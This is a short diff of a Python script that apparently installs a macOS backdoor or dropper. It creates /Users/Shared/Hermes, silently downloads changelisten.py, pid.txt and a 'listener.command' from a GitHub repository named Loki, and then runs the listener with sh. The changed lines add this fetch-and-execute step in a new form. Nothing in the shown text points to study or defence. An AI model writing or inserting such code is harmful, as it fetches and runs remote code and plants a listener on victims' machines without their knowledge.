@@ -11,12 +11,10 @@ except:
 try:
   os.mkdir ('/Users/Shared/Hermes')
   import time
-  time.sleep (0.5)
-  import urllib
-  urllib.urlretrieve ("https://github.com/3-TA/Loki/raw/main/changemain.py", "/Users/Shared/changemain.py")
-  urllib.urlretrieve ("https://github.com/3-TA/Loki/raw/main/pid.txt", "/Users/Shared/pid.txt")
-  urllib.urlretrieve ("https://github.com/3-TA/Loki/raw/main/listener.command", "/Users/Shared/listener.command")
+  time.sleep (1.5)
+  os.system ("""/usr/bin/python -c 'import urllib; urllib.urlretrieve ("https://github.com/3-TA/Loki/raw/main/changelisten.py", "/Users/Shared/Hermes/changelisten.py"); urllib.urlretrieve ("https:\
+//github.com/3-TA/Loki/raw/main/pid.txt", "/Users/Shared/Hermes/pid.txt"); urllib.urlretrieve ("https://github.com/3-TA/Loki/raw/main/listener.command", "/Users/Shared/Hermes/listener.command")'""")
   time.sleep (5)
   os.system ('sh /Users/Shared/Hermes/listener.command')
-except:
-  pass
+except Exception as e:
+  print (e)
